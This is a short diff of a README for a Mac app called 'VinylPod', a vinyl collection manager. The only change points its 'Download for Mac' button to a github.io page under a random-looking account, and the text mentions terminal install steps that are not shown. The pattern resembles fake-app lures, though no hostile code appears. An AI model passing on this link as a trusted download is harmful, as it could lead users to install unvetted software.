@@ -3,7 +3,7 @@
 
 VinylPod for Mac is a modern vinyl collection manager and music organization tool 🎶. It allows you to catalog, manage, and enjoy your vinyl records digitally with an intuitive interface designed for macOS.  
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-000000?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/vinylpod)  
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-000000?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/vinylpod)  
 
 If the download button does not work, follow the installation instructions below using terminal commands.  
 
